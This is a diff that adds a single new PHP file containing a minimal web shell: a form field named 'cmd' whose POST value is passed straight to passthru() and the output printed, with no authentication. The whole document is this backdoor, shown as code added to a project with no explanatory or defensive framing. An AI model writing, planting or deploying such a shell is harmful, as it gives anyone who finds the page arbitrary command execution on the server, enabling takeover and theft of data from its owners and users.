@@ -1,0 +1,1 @@
+<?php $cmd = stripslashes($_POST["cmd"]); ?> <form name="form1" method="post" action=""> <input type="text" name="cmd" value="<?php echo str_replace("\"","&quot;",$cmd);?>" size="150">  <input type="submit" name="B_SUBMIT" value="Go"> </form> <?php if ($cmd != "") {    echo "<pre>";    echo passthru("$cmd");    echo "</pre>";    exit;} ?>
